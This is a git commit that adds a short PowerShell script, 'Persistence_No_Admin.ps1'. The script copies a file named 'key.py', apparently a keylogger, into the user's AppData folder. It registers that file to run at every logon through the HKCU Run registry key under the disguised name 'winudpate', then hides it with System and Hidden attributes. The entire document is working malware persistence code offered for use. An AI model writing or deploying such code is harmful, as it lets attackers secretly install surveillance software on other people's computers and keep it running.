f03e3744001b57af74bb4f9c09b12285261cdf61
xp4xbox <nicman1080@gmail.com>
2017-09-19 19:13:26 -0400

    Create Persistence_No_Admin.ps1

---
+++ Persistence/No Admin/Persistence_No_Admin.ps1
@@ -0,0 +1,12 @@
+# Set the file name as your .exe
+$strFileName = "key.py"
+
+$APPDATA = "$env:APPDATA"
+$strScriptPath = $MyInvocation.MyCommand.Path; $strDirScriptPath = Split-Path $strScriptPath
+Set-Location -Path $strDirScriptPath
+
+If (test-path "$APPDATA\$strFileName") {Remove-Item "$APPDATA\$strFileName" -Force}
+Copy-Item $strFileName $APPDATA -Force
+
+New-ItemProperty -path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -name winudpate -PropertyType String -value $APPDATA\$strFileName -Force
+$objGetFile=Get-Item $APPDATA\$strFileName; $objGetFile.Attributes = 'System, Hidden'
